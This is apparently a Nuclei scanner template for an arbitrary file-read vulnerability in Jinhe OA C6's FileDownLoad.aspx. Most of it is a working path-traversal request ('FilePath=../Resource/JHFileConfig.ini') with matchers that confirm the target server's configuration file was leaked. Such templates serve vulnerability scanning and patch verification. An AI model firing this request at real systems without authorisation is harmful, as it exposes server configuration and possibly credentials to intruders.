id: jinheOA-C6-FileDownLoad-aspx-fileread

info:
  name: 金和OAC6-FileDownLoad.aspx任意文件读取漏洞
  author: cnaq
  severity: medium
  description: 金和OAC6-FileDownLoad.aspx任意文件读取漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COAC6-FileDownLoad.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: jinheOA,download,file,read
requests:
  - raw:
      - |
        GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        condition: and
        part: body
        words:
          - 'JHFile'